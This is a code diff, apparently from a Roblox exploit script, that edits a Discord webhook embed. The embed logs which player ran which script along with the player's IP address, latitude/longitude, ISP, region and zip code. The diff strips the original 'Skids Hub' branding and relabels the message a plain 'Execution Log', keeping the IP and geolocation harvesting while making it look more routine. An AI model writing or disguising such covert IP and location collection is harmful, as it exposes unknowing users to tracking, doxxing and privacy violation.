@@ -38,12 +38,10 @@ do
                 ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName,
                 ["embeds"] = {
                         {
-                        ["title"] = "Skids API",
-                        ["description"] = "__a library made for skids :wink:__",
+                        ["title"] = "Execution Log",
                         ['thumbnail'] = {
                             ['url']=string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&UserId=%d&format=png',player.UserId)
                         },
-                        ["url"] = "https://discord.gg/EUaH265S",
                         ["color"] = 526344,
                         ["fields"] = {
                             {
@@ -52,17 +50,13 @@ do
                             },
                             {
                             ["name"] = "More Info",
-                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*Isp/Org*: %s\n*Exploit: %s*\n*Country/Region: %s/%s*\n*zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
+                            ["value"] = string.format("*IPV4: ||%s||*\n*Lat/Lon: %s/%s*\n**ISP**: %s\n*Used: %s*\n*Region: %s/%s*\n*Zipcode: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
                         ["author"] = {
-                            ["name"] = "Skids Hub/ramirez",
-                            ["url"] = "https://discord.gg/EUaH265S",
-                            ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
+                            ["name"] = "Execution Log",
                         },
                         ["footer"] = {
-                            ["text"] = "Skids Hub/ramirez",
-                            ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                         },
                         ["timestamp"] = parseDateTime()
                         }
